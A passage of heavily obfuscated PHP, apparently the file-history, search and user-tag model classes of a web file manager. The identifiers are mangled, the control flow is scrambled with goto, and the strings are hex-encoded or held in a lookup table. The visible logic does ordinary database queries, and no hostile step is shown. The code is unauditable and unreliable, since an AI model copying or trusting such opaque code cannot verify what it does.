$A∑√êµÒÔÖ = Model($cÇª©â¢çÓ[1062])->get($cÇª©â¢çÓ[2200]); goto dóÖÙëÛÖÕ; eﬂß∑˘‚∞¯: $cÇª©â¢çÓ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÓ“ﬁ‘ÿÕ… = array($cÇª©â¢çÓ[380] => $FÕÔ‡ÃùÉù); $cÈÿÃë÷‹Ê = $cÇª©â¢çÓ[2203]; goto b–âË≥àΩÚ; dÆ—ı€‹ÍÃ: } protected function _listAppendUser(&$B®òâÃÇ¶à) { $aµ¨„∞ÇêÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fﬂΩ’‰Ò·¨ = array_to_keyvalue($B®òâÃÇ¶à, $aµ¨„∞ÇêÂ[33], $aµ¨„∞ÇêÂ[1349]); $fåé≈•ê≈˜ = Model($aµ¨„∞ÇêÂ[469])->userListInfo($fﬂΩ’‰Ò·¨); foreach ($B®òâÃÇ¶à as &$cÜûÿÊÛÍÜ) { $aˆ›ª«ıé’ = $cÜûÿÊÛÍÜ[$aµ¨„∞ÇêÂ[1349]]; $cÜûÿÊÛÍÜ[$aµ¨„∞ÇêÂ[375]] = $fåé≈•ê≈˜[$aˆ›ª«ıé’] ? $fåé≈•ê≈˜[$aˆ›ª«ıé’] : !1; } } public function fileInfo($AÀë⁄ã»’≥) { $bã¿—›ÏÖñ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F»´Öê¬Ìô = $this->tablePrefix; $f†êû◊ê∑æ = "{$F»´Öê¬Ìô}\x69\157\137\x66\151\x6c\x65\x20\x66\151\x6c\x65\163\40\157\x6e\x20\146\151\x6c\145\x73\56\146\151\154\145\111\x44\40\75\40\x68\151\x73\164\x6f\x72\171\x2e\x66\151\x6c\x65\111\x44"; return $this->alias($bã¿—›ÏÖñ[2208])->where(array($bã¿—›ÏÖñ[382] => $AÀë⁄ã»’≥))->join($f†êû◊ê∑æ, $bã¿—›ÏÖñ[2209])->find(); } public function removeItem($cçÔøÌµÂÛ) { $F•Ï°É≥√Ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bﬂ¢∂ôêÔÀ = array($F•Ï°É≥√Ñ[382] => $cçÔøÌµÂÛ); $F°ºÃ•Øƒı = $this->where($Bﬂ¢∂ôêÔÀ)->find(); if ($F°ºÃ•Øƒı) { $f»ç…¥≤À€ = $this->where($Bﬂ¢∂ôêÔÀ)->delete(); Model($F•Ï°É≥√Ñ[418])->remove($F°ºÃ•Øƒı[$F•Ï°É≥√Ñ[415]]); return $f»ç…¥≤À€; } return !1; } public function removeBySource($C“ıÜú»ïù) { goto Bì⁄ˆùèáÖ; eô≤é‡ÌÃ¯: return !0; goto eÁ∂Ùàä®Ç; Bì⁄ˆùèáÖ: $eÎû„ë»˜„ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$C“ıÜú»ïù) { return !1; } if (!is_array($C“ıÜú»ïù)) { $C“ıÜú»ïù = array($C“ıÜú»ïù); } goto a≥»ªÔ¡¢â; a≥»ªÔ¡¢â: $BÛπ¬®•øö = array($eÎû„ë»˜„[380] => array($eÎû„ë»˜„[7], $C“ıÜú»ïù)); $Câä¯è∆‘õ = $this->field($eÎû„ë»˜„[416])->where($BÛπ¬®•øö)->select(); if ($Câä¯è∆‘õ) { $this->where($BÛπ¬®•øö)->delete(); $E˘”∆£≤ Î = array_to_keyvalue($Câä¯è∆‘õ, $eÎû„ë»˜„[33], $eÎû„ë»˜„[415]); Model($eÎû„ë»˜„[418])->remove($E˘”∆£≤ Î); } goto eô≤é‡ÌÃ¯; eÁ∂Ùàä®Ç: } public function setDetail($EΩåáË⁄Ç•, $b‡¡ä€Œ∂ê) { $D≠óß°∫§ =& $_SERVER[£¿ÌÙëü¡¯¯]; return $this->where(array($D≠óß°∫§[382] => $EΩåáË⁄Ç•))->save(array($D≠óß°∫§[2197] => $b‡¡ä€Œ∂ê)); } public function rollbackToItem($fãë—Àﬂä‘, $cõú˜°€ÿ∫) { goto Bó¶πÉÒü¯; eØó‘†òü∞: $B„–ôÈÕ°Ç = $this->find($cõú˜°€ÿ∫); $d„≥”Ö¢∂∏ = array($bÑ√õˆﬂÊ˘[415] => $B„–ôÈÕ°Ç[$bÑ√õˆﬂÊ˘[415]], $bÑ√õˆﬂÊ˘[78] => $B„–ôÈÕ°Ç[$bÑ√õˆﬂÊ˘[78]], $bÑ√õˆﬂÊ˘[108] => time(), $bÑ√õˆﬂÊ˘[376] => USER_ID); Model($bÑ√õˆﬂÊ˘[749])->where(array($bÑ√õˆﬂÊ˘[366] => $fãë—Àﬂä‘))->save($d„≥”Ö¢∂∏); goto Aë‰ó£ó¿§; Bó¶πÉÒü¯: $bÑ√õˆﬂÊ˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÏÂƒ€¨ß∏ = Model($bÑ√õˆﬂÊ˘[749])->sourceInfo($fãë—Àﬂä‘); $this->addHistory($DÏÂƒ€¨ß∏); goto eØó‘†òü∞; Aë‰ó£ó¿§: return $this->where(array($bÑ√õˆﬂÊ˘[382] => $cõú˜°€ÿ∫))->delete(); goto FÿﬂÂÌ‚π◊; FÿﬂÂÌ‚π◊: } public function clearSame($d·’í÷ﬂÑ˘) { goto CŸıœü÷ùÎ; e…»˘ÙæœÍ: if (!$aªºà”¬—Ô) { return; } $this->where(array($f∆õú©—â†[364] => array($f∆õú©—â†[7], $aªºà”¬—Ô)))->delete(); Model($f∆õú©—â†[418])->remove($cÙØ˜Ùª∏’); goto e“⁄⁄ò¢€ß; AŒ«≠ÚÏùÑ: $cÙØ˜Ùª∏’ = array(); $aªºà”¬—Ô = array(); foreach ($céüÖö»†ø as $eÒ®¬≈ÓÜŸ) { if (count($eÒ®¬≈ÓÜŸ) <= 1) { continue; } foreach ($eÒ®¬≈ÓÜŸ as $aä™â¡µ⁄∞) { $cÙØ˜Ùª∏’[] = $aä™â¡µ⁄∞[$f∆õú©—â†[415]]; $aªºà”¬—Ô[] = $aä™â¡µ⁄∞[$f∆õú©—â†[364]]; } } goto e…»˘ÙæœÍ; CŸıœü÷ùÎ: $f∆õú©—â† =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÊÏÃ¥‘·® = $this->listData($d·’í÷ﬂÑ˘); $céüÖö»†ø = array_to_keyvalue_group($aÊÏÃ¥‘·®, $f∆õú©—â†[415]); goto AŒ«≠ÚÏùÑ; e“⁄⁄ò¢€ß: } public function userSpace() { $døŒÂèÎ—‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aâ÷Ëòõõÿ = $this->tablePrefix; $fïõ—∞–Âô = array($døŒÂèÎ—‰[1340] => USER_ID); $bÇ§ãÕÉë§ = "{$aâ÷Ëòõõÿ}\x69\157\x5f\x66\151\154\145\40\146\x69\x6c\145\163\x20\157\156\40\146\x69\x6c\x65\x73\56\146\151\154\145\111\104\40\75\40\150\151\163\x74\x6f\x72\x79\x2e\x66\151\154\145\111\104"; return $this->alias($døŒÂèÎ—‰[2208])->where($fïõ—∞–Âô)->join($bÇ§ãÕÉë§, $døŒÂèÎ—‰[2209])->sum($døŒÂèÎ—‰[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($AÁ„∑¶∆ΩŒ) { goto cÑ¡Í»îÀÜ; cÑ¡Í»îÀÜ: $AﬂÉ·∆á∞¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CŒßÂË¢‰Õ = KodIO::fileTypeList(); $B‹•ë√®—… = $CŒßÂË¢‰Õ[$AÁ„∑¶∆ΩŒ]; goto eØ§≠Œ€ùÈ; eØ§≠Œ€ùÈ: if (!$B‹•ë√®—…) { return array(); } $e©ã‰€õ‚Ã = $B‹•ë√®—…[$AﬂÉ·∆á∞¥[157]]; $EËå’ê£ôÆ = $AﬂÉ·∆á∞¥[7]; goto D¶◊õΩø√ü; D¶◊õΩø√ü: if (!$B‹•ë√®—…[$AﬂÉ·∆á∞¥[157]]) { $E‹…úàôÖ = array_to_keyvalue($CŒßÂË¢‰Õ, $AﬂÉ·∆á∞¥[33], $AﬂÉ·∆á∞¥[157]); $e©ã‰€õ‚Ã = implode($AﬂÉ·∆á∞¥[47], $E‹…úàôÖ); $EËå’ê£ôÆ = $AﬂÉ·∆á∞¥[2166]; } $Cå÷†∏ç°Ÿ = explode($AﬂÉ·∆á∞¥[47], trim($e©ã‰€õ‚Ã, $AﬂÉ·∆á∞¥[47])); return array($EËå’ê£ôÆ, $Cå÷†∏ç°Ÿ); goto A·—œäê„©; A·—œäê„©: } public function listPathType($d•ôÚä˜¯®) { $c¯Ç≈Â¥Œ§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C‘±ƒè«•µ = $this->fileTypeWhere($d•ôÚä˜¯®); if (!$C‘±ƒè«•µ) { return array(); } $bëåƒÒÌÔÁ = array($c¯Ç≈Â¥Œ§[513] => SourceModel::TYPE_USER, $c¯Ç≈Â¥Œ§[514] => USER_ID, $c¯Ç≈Â¥Œ§[510] => 0, $c¯Ç≈Â¥Œ§[511] => $C‘±ƒè«•µ); return $this->listSource($bëåƒÒÌÔÁ); } public function listSearch($b„’◊»º¬≥, $A•¿„∂« ´ = 300) { goto eõ∏»‰◊∫É; EªÒïÆ∏ë‡: $this->_listMake($cÚà»ÑÈµ¯); return $cÚà»ÑÈµ¯; goto bÔ¯¬¯ﬂ„÷; aû‘≤ô∏¥ü: $this->_listSearchDesc($cÚà»ÑÈµ¯, $b„’◊»º¬≥, $A√≠≠È¶ê£); $this->_listSearchTag($cÚà»ÑÈµ¯, $b„’◊»º¬≥, $A√≠≠È¶ê£); $this->_listDataApply($cÚà»ÑÈµ¯[$B„êÚ»ª¿á[350]]); goto EªÒïÆ∏ë‡; eõ∏»‰◊∫É: $B„êÚ»ª¿á =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($b„’◊»º¬≥[$B„êÚ»ª¿á[2091]]) && $b„’◊»º¬≥[$B„êÚ»ª¿á[2091]]) { $b„’◊»º¬≥[$B„êÚ»ª¿á[2091]] = str_replace($B„êÚ»ª¿á[1500], $B„êÚ»ª¿á[2210], trim($b„’◊»º¬≥[$B„êÚ»ª¿á[2091]])); } $BÚßÍê“•Ü = $this->_parseSearchWhere($b„’◊»º¬≥); goto cêÏÑ± åû; cêÏÑ± åû: if (!isset($BÚßÍê“•Ü[$B„êÚ»ª¿á[393]])) { $BÚßÍê“•Ü[$B„êÚ»ª¿á[393]] = 0; } $DÑúÔÃŸüâ = $B„êÚ»ª¿á[2211]; $A√≠≠È¶ê£ = $DÑúÔÃŸüâ; goto C·îéÜÃÏ§; C·îéÜÃÏ§: $this->_listSearchBindPinyin($b„’◊»º¬≥, $BÚßÍê“•Ü, $DÑúÔÃŸüâ); $this->alias($B„êÚ»ª¿á[479])->_makeOrder()->cache(null, 10); $cÚà»ÑÈµ¯ = $this->distinct(!0)->field($DÑúÔÃŸüâ)->where($BÚßÍê“•Ü)->selectPage($A•¿„∂« ´); goto aû‘≤ô∏¥ü; bÔ¯¬¯ﬂ„÷: } private function _listSearchTag(&$cä∫Ïóè∏í, $CﬂÏùµäÔâ, $B‘Çù‘ÇÌ®) { goto DºÃ¶«ÜÀ™; F“ﬂÎ°’õ—: $bé¿ØÖ¿“‘ = array(); $CÏÏ˜¿•ºî = $CﬂÏùµäÔâ[$eïˆªâõÃµ[2091]]; foreach ($A £©∏ù…‰ as $b≥•ÿ◊ÓéÔ) { $Eú÷»üÑºÁ = $b≥•ÿ◊ÓéÔ[$eïˆªâõÃµ[28]]; $c°áˆ¨ã¿É = str_replace($eïˆªâõÃµ[50], $eïˆªâõÃµ[33], Pinyin::encode($Eú÷»üÑºÁ)); if (stripos($Eú÷»üÑºÁ, $CÏÏ˜¿•ºî) !== !1 || stripos($c°áˆ¨ã¿É, $CÏÏ˜¿•ºî) !== !1) { $bé¿ØÖ¿“‘[] = $b≥•ÿ◊ÓéÔ[$eïˆªâõÃµ[364]]; } } goto Cï «âòµç; DºÃ¶«ÜÀ™: $eïˆªâõÃµ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$CﬂÏùµäÔâ[$eïˆªâõÃµ[2091]] || $cä∫Ïóè∏í[$eïˆªâõÃµ[347]][$eïˆªâõÃµ[336]] > 1) { return; } $A £©∏ù…‰ = Model($eïˆªâõÃµ[2212])->listData(); goto F“ﬂÎ°’õ—; A‡›«öÖ¥Ì: $dø√ŸÿøëÚ = array_to_keyvalue($dø√ŸÿøëÚ, $eïˆªâõÃµ[33], $eïˆªâõÃµ[76]); $f◊™í‡∏⁄ﬁ = array_unique($dø√ŸÿøëÚ); $this->_listSearchMerge($cä∫Ïóè∏í, $CﬂÏùµäÔâ, $B‘Çù‘ÇÌ®, $f◊™í‡∏⁄ﬁ); goto cñ∆©ï—àï; Cï «âòµç: if (!$bé¿ØÖ¿“‘) { return; } $CúåãÖËß® = array($eïˆªâõÃµ[390] => array($eïˆªâõÃµ[7], $bé¿ØÖ¿“‘)); $dø√ŸÿøëÚ = Model($eïˆªâõÃµ[2213])->field($eïˆªâõÃµ[76])->where($CúåãÖËß®)->select(); goto A‡›«öÖ¥Ì; cñ∆©ï—àï: } private function _listSearchDesc(&$Eﬁ∑≤ΩÎ∂Ì, $BØò≠ìÍ‚ﬂ, $c±·ëíÜË‘) { goto BÛ¢´¿√ﬁ; c÷–íè´É¥: $f‘Â‹Éä±◊ = Model($CÂã¿©óóÒ[496])->field($CÂã¿©óóÒ[366])->where($eõŒŒ∂Ù¢é)->select(); $cè‹Ì∞∫‹∞ = array_to_keyvalue($f‘Â‹Éä±◊, $CÂã¿©óóÒ[33], $CÂã¿©óóÒ[366]); $this->_listSearchMerge($Eﬁ∑≤ΩÎ∂Ì, $BØò≠ìÍ‚ﬂ, $c±·ëíÜË‘, $cè‹Ì∞∫‹∞); goto bÇ…¯∞ˆéª; BÛ¢´¿√ﬁ: $CÂã¿©óóÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$BØò≠ìÍ‚ﬂ[$CÂã¿©óóÒ[2091]] || $Eﬁ∑≤ΩÎ∂Ì[$CÂã¿©óóÒ[347]][$CÂã¿©óóÒ[336]] > 1) { return; } $E∑®ë™‡ç§ = $this->listSearchChildren($BØò≠ìÍ‚ﬂ[$CÂã¿©óóÒ[457]]); goto E‰è“°âÓ§; E‰è“°âÓ§: $E∑®ë™‡ç§ = array_unique($E∑®ë™‡ç§); if (!$E∑®ë™‡ç§) { return; } $eõŒŒ∂Ù¢é = array($CÂã¿©óóÒ[366] => array($CÂã¿©óóÒ[7], $E∑®ë™‡ç§), $CÂã¿©óóÒ[90] => $CÂã¿©óóÒ[401], $CÂã¿©óóÒ[354] => array($CÂã¿©óóÒ[748], $CÂã¿©óóÒ[2093] . $BØò≠ìÍ‚ﬂ[$CÂã¿©óóÒ[2091]] . $CÂã¿©óóÒ[2093])); goto c÷–íè´É¥; bÇ…¯∞ˆéª: } private function _listSearchMerge(&$b∂–ªõ˜ç•, $CÒÊ±ííÛ‹, $FñÓ îØ¯¢, $a·Í›ª≈Çå) { goto FÔœ•Ãó≤¡; Dæ™ÕÔûêé: $AΩâÜÑ‘êß = array_diff($a·Í›ª≈Çå, $F∂ÑôÒˆóá); if (!$AΩâÜÑ‘êß) { return; } $A¨ÇÚ—Ùàú = array($fı◊±›áê«[366] => array($fı◊±›áê«[7], $AΩâÜÑ‘êß)); goto cÜ÷ŒÇªΩı; D≠·óõîú„: foreach ($eâı˘ò€Øà as $FÖë…Õ∆´®) { $BèÂªì£çı = $fı◊±›áê«[47] . $CÒÊ±ííÛ‹[$fı◊±›áê«[457]] . $fı◊±›áê«[47]; if (stripos($FÖë…Õ∆´®[$fı◊±›áê«[455]], $BèÂªì£çı) !== !1) { $Cﬁâ´¨é‹Ö[] = $FÖë…Õ∆´®; } } $b∂–ªõ˜ç•[$fı◊±›áê«[350]] = array_merge($Cﬁâ´¨é‹Ö, $b∂–ªõ˜ç•[$fı◊±›áê«[350]]); $b∂–ªõ˜ç•[$fı◊±›áê«[347]][$fı◊±›áê«[348]] += count($Cﬁâ´¨é‹Ö); goto D…õÇµ–ê·; FÔœ•Ãó≤¡: $fı◊±›áê« =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$a·Í›ª≈Çå) { return; } $F∂ÑôÒˆóá = array_to_keyvalue($b∂–ªõ˜ç•[$fı◊±›áê«[350]], $fı◊±›áê«[33], $fı◊±›áê«[366]); goto Dæ™ÕÔûêé; cÜ÷ŒÇªΩı: $eâı˘ò€Øà = $this->field($FñÓ îØ¯¢)->where($A¨ÇÚ—Ùàú)->select(); if (!$eâı˘ò€Øà) { return; } $Cﬁâ´¨é‹Ö = array(); goto D≠·óõîú„; D…õÇµ–ê·: } public function listSearchChildren($a∏“Çª„Çß, $dˆÇ—Ö™ÖÚ = 5000) { goto Añü£ˆû¿; Añü£ˆû¿: $cÓ„æ´œË =& $_SERVER[£¿ÌÙëü¡¯¯]; $E¯ùÛâÈÆ‚ = array(); $e÷πÇè£®ì = $this->sourceInfo($a∏“Çª„Çß); goto féÎ”•æä¥; FùˆÍºü €: $cÆÛí∑≥Ÿ· = $this->field($cÓ„æ´œË[366])->where($Fáî™õõøº)->select(); $E¯ùÛâÈÆ‚ = array_to_keyvalue($cÆÛí∑≥Ÿ·, $cÓ„æ´œË[33], $cÓ„æ´œË[366]); return $E¯ùÛâÈÆ‚; goto A«”ºó´’◊; féÎ”•æä¥: $Fáî™õõøº = array($cÓ„æ´œË[455] => array($cÓ„æ´œË[748], $e÷πÇè£®ì[$cÓ„æ´œË[455]] . $e÷πÇè£®ì[$cÓ„æ´œË[366]] . $cÓ„æ´œË[476])); $D„€⁄∑Ì±™ = $this->field($cÓ„æ´œË[366])->cache(null, 600)->where($Fáî™õõøº)->count(); if ($D„€⁄∑Ì±™ > $dˆÇ—Ö™ÖÚ) { return $this->_listSearchChildrenNear($a∏“Çª„Çß, $dˆÇ—Ö™ÖÚ); } goto FùˆÍºü €; A«”ºó´’◊: } private function _listSearchChildrenNear($e•§Øœ¯êà, $CÃàÑßˆÉö) { goto Bßà«∆®⁄É; eÛ–ËËµìá: $FøâÈ«∫Ïˆ = array_merge($FøâÈ«∫Ïˆ, array_to_keyvalue($c‡Ã™˘Á∆å, $cÎàÜãòæõ[33], $cÎàÜãòæõ[366])); $FøâÈ«∫Ïˆ = array_slice($FøâÈ«∫Ïˆ, 0, $CÃàÑßˆÉö); return $FøâÈ«∫Ïˆ; goto A„ÿâ—ŒΩé; Cãá≥”éâê: $c‡Ã™˘Á∆å = $this->field($cÎàÜãòæõ[2214])->where($B‡◊ê’˘Œ±)->select(); $FﬁŒËçö∑ÿ = array_to_keyvalue(array_filter_by_field($c‡Ã™˘Á∆å, $cÎàÜãòæõ[367], $cÎàÜãòæõ[84]), $cÎàÜãòæõ[33], $cÎàÜãòæõ[366]); $FøâÈ«∫Ïˆ = array_merge($FøâÈ«∫Ïˆ, array_to_keyvalue($c‡Ã™˘Á∆å, $cÎàÜãòæõ[33], $cÎàÜãòæõ[366])); goto f°Ó≈‰õ´Ü; Bßà«∆®⁄É: $cÎàÜãòæõ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FøâÈ«∫Ïˆ = array(); $B‡◊ê’˘Œ± = array($cÎàÜãòæõ[457] => $e•§Øœ¯êà); goto Cãá≥”éâê; f°Ó≈‰õ´Ü: if (!$FﬁŒËçö∑ÿ) { return $FøâÈ«∫Ïˆ; } $B‡◊ê’˘Œ± = array($cÎàÜãòæõ[457] => array($cÎàÜãòæõ[7], $FﬁŒËçö∑ÿ)); $c‡Ã™˘Á∆å = $this->field($cÎàÜãòæõ[2214])->where($B‡◊ê’˘Œ±)->select(); goto eÛ–ËËµìá; A„ÿâ—ŒΩé: } private function _listSearchBindPinyin($CÖÆÿ›ëŸã, &$E∑Õ Ì√∞â, &$CÇﬁìÜ“¥ê) { goto EÃ®˘ç¡—ä; EÃ®˘ç¡—ä: $dæÙ£¡Á≈ı =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!Input::check($CÖÆÿ›ëŸã[$dæÙ£¡Á≈ı[2091]], $dæÙ£¡Á≈ı[303]) || strlen($CÖÆÿ›ëŸã[$dæÙ£¡Á≈ı[2091]]) < 2) { return; } $F“†∞†ˆÚÍ = "\x4c\x45\x46\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\x72\x63\145\x5f\155\x65\x74\x61\40\x6d\145\164\x61\x20\x6f\x6e\40\163\157\165\x72\x63\x65\56\x73\157\165\162\143\145\x49\x44\40\x3d\40\155\x65\164\141\x2e\x73\x6f\x75\x72\143\145\111\x44"; goto f•·æŒ±ﬂã; f•·æŒ±ﬂã: $Aµ’µ˘ã±á = array(); $CÇﬁìÜ“¥ê = str_replace(array($dæÙ£¡Á≈ı[214], $dæÙ£¡Á≈ı[50], $dæÙ£¡Á≈ı[2215]), $dæÙ£¡Á≈ı[33], $CÇﬁìÜ“¥ê); $CÇﬁìÜ“¥ê = $dæÙ£¡Á≈ı[2216] . str_replace($dæÙ£¡Á≈ı[47], $dæÙ£¡Á≈ı[2217], $CÇﬁìÜ“¥ê); goto D¬ÆùÛ≤≠°; FÖÕœ—’ôù: $Aµ’µ˘ã±á[] = array($dæÙ£¡Á≈ı[2218] => $a ®™¿êîÚ, $dæÙ£¡Á≈ı[912] => $dæÙ£¡Á≈ı[2095], array($dæÙ£¡Á≈ı[2219] => $a ®™¿êîÚ, $dæÙ£¡Á≈ı[2220] => array($dæÙ£¡Á≈ı[7], array($dæÙ£¡Á≈ı[412], $dæÙ£¡Á≈ı[411])))); $this->join($F“†∞†ˆÚÍ); $E∑Õ Ì√∞â = $Aµ’µ˘ã±á; goto e∂‰¶ò·Êœ; D¬ÆùÛ≤≠°: unset($E∑Õ Ì√∞â[$dæÙ£¡Á≈ı[28]]); foreach ($E∑Õ Ì√∞â as $a∫˘ÑÊËµµ => $C–‹âÜø‹â) { $Aµ’µ˘ã±á[$dæÙ£¡Á≈ı[2216] . $a∫˘ÑÊËµµ] = $C–‹âÜø‹â; } $a ®™¿êîÚ = array($dæÙ£¡Á≈ı[475], $dæÙ£¡Á≈ı[2093] . $CÖÆÿ›ëŸã[$dæÙ£¡Á≈ı[2091]] . $dæÙ£¡Á≈ı[2093]); goto FÖÕœ—’ôù; e∂‰¶ò·Êœ: } private function _parseSearchWhere($B £†ÿœ‘í) { goto A¿Ï»à—è⁄; e∫•»Ñî≤Ã: if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[2091]]) && $B £†ÿœ‘í[$fÎ˘ëàÚù◊[2091]]) { $Aè“øÉéèÓ = $B £†ÿœ‘í[$fÎ˘ëàÚù◊[2091]]; $d›öÁ‹é©ã = explode($fÎ˘ëàÚù◊[50], $Aè“øÉéèÓ); if (strlen($Aè“øÉéèÓ) > 2 && (substr($Aè“øÉéèÓ, 0, 1) == $fÎ˘ëàÚù◊[114] && substr($Aè“øÉéèÓ, -1) == $fÎ˘ëàÚù◊[114]) || substr($Aè“øÉéèÓ, 0, 1) == $fÎ˘ëàÚù◊[55] && substr($Aè“øÉéèÓ, -1) == $fÎ˘ëàÚù◊[55]) { $Aè“øÉéèÓ = substr($Aè“øÉéèÓ, 1, -1); $d›öÁ‹é©ã = array($Aè“øÉéèÓ); } $dÜå€˜Îíô[$fÎ˘ëàÚù◊[28]] = array($fÎ˘ëàÚù◊[475], $fÎ˘ëàÚù◊[2093] . $Aè“øÉéèÓ . $fÎ˘ëàÚù◊[2093]); if (count($d›öÁ‹é©ã) > 1) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[28]] = array(); foreach ($d›öÁ‹é©ã as $Cè»ß—€¥ß) { if (!trim($Cè»ß—€¥ß)) { continue; } $dÜå€˜Îíô[$fÎ˘ëàÚù◊[28]][] = array($fÎ˘ëàÚù◊[475], $fÎ˘ëàÚù◊[2093] . trim($Cè»ß—€¥ß) . $fÎ˘ëàÚù◊[2093]); } } } return $dÜå€˜Îíô; goto E‰ΩÇÂã»»; F°ää»ÂÏ—: if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[690]])) { $EµÓÿÛÒ∫⁄ = array($fÎ˘ëàÚù◊[2222], $B £†ÿœ‘í[$fÎ˘ëàÚù◊[690]]); if ($dÜå€˜Îíô[$fÎ˘ëàÚù◊[108]]) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[108]] = array($dÜå€˜Îíô[$fÎ˘ëàÚù◊[108]], $EµÓÿÛÒ∫⁄, $fÎ˘ëàÚù◊[2223]); } else { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[108]] = $EµÓÿÛÒ∫⁄; } } if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[2224]])) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[78]] = array($fÎ˘ëàÚù◊[2221], $B £†ÿœ‘í[$fÎ˘ëàÚù◊[2224]]); } if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[2225]])) { $EµÓÿÛÒ∫⁄ = array($fÎ˘ëàÚù◊[2222], $B £†ÿœ‘í[$fÎ˘ëàÚù◊[2225]]); if ($dÜå€˜Îíô[$fÎ˘ëàÚù◊[78]]) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[78]] = array($dÜå€˜Îíô[$fÎ˘ëàÚù◊[78]], $EµÓÿÛÒ∫⁄, $fÎ˘ëàÚù◊[2223]); } else { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[78]] = $EµÓÿÛÒ∫⁄; } } goto cøüêÙ˜¢á; A¿Ï»à—è⁄: $fÎ˘ëàÚù◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÜå€˜Îíô = array(); if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[689]])) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[108]] = array($fÎ˘ëàÚù◊[2221], $B £†ÿœ‘í[$fÎ˘ëàÚù◊[689]]); } goto F°ää»ÂÏ—; cøüêÙ˜¢á: if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[527]])) { $dÜå€˜Îíô[] = array($fÎ˘ëàÚù◊[376] => $B £†ÿœ‘í[$fÎ˘ëàÚù◊[527]], $fÎ˘ëàÚù◊[375] => $B £†ÿœ‘í[$fÎ˘ëàÚù◊[527]], $fÎ˘ëàÚù◊[912] => $fÎ˘ëàÚù◊[2095]); } if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[369]])) { $fî≠çÆ‹ó = $B £†ÿœ‘í[$fÎ˘ëàÚù◊[369]]; if ($fî≠çÆ‹ó == $fÎ˘ëàÚù◊[77]) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[367]] = 1; } else { if ($fî≠çÆ‹ó == $fÎ˘ëàÚù◊[2226]) { $dÜå€˜Îíô[$fÎ˘ëàÚù◊[367]] = 0; } else { if ($fî≠çÆ‹ó) { $fî≠çÆ‹ó = is_array($fî≠çÆ‹ó) ? $fî≠çÆ‹ó : explode($fÎ˘ëàÚù◊[47], $fî≠çÆ‹ó); $dÜå€˜Îíô[$fÎ˘ëàÚù◊[369]] = array($fÎ˘ëàÚù◊[381], $fî≠çÆ‹ó); $dÜå€˜Îíô[$fÎ˘ëàÚù◊[367]] = 0; } } } } if (isset($B £†ÿœ‘í[$fÎ˘ëàÚù◊[457]])) { $aÔ°Ô˜≠·Ø = $this->sourceInfo($B £†ÿœ‘í[$fÎ˘ëàÚù◊[457]]); $dÜå€˜Îíô[$fÎ˘ëàÚù◊[517]] = array($fÎ˘ëàÚù◊[475], $aÔ°Ô˜≠·Ø[$fÎ˘ëàÚù◊[455]] . $B £†ÿœ‘í[$fÎ˘ëàÚù◊[457]] . $fÎ˘ëàÚù◊[476]); } goto e∫•»Ñî≤Ã; E‰ΩÇÂã»»: } } goto fùÆê‹°§Æ; eÌñù±ÑÆÿ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($DÎªŒ˜êŒ∂) { $E«—÷≈“÷Õ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($E«—÷≈“÷Õ[2368] => array(USER_ID, $E«—÷≈“÷Õ[2424])); } protected function listData() { $B„–›öÇ“≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aø…∫â‰Çÿ = array($B„–›öÇ“≥[1340] => USER_ID, $B„–›öÇ“≥[432] => array($B„–›öÇ“≥[2425], 0)); $a‡°˜ò⁄™á = $B„–›öÇ“≥[2426]; $f ¥ŒôÆŒ” = $B„–›öÇ“≥[2427]; $CµÚÎÃâÆë = $this->field($a‡°˜ò⁄™á)->where($aø…∫â‰Çÿ)->order($f ¥ŒôÆŒ”)->select(); return $CµÚÎÃâÆë ? $CµÚÎÃâÆë : array(); } protected function listByTag($CÃ˘∏Ü§∏ı) { } protected function addToTag($c∞Í§ÙãÍ∏, $dºÙí©ëŒƒ) { $BÒÉùéü€ﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!Model($BÒÉùéü€ﬂ[2212])->listData($dºÙí©ëŒƒ) || !Model($BÒÉùéü€ﬂ[749])->pathInfo($c∞Í§ÙãÍ∏)) { return !1; } $Eä¨·¥éÎ‹ = array($BÒÉùéü€ﬂ[1340] => USER_ID, $BÒÉùéü€ﬂ[432] => $dºÙí©ëŒƒ, $BÒÉùéü€ﬂ[384] => $c∞Í§ÙãÍ∏, $BÒÉùéü€ﬂ[385] => $BÒÉùéü€ﬂ[379], $BÒÉùéü€ﬂ[383] => $BÒÉùéü€ﬂ[33], $BÒÉùéü€ﬂ[2017] => 0); if ($this->where($Eä¨·¥éÎ‹)->find()) { return !1; } return $this->add($Eä¨·¥éÎ‹); } protected function 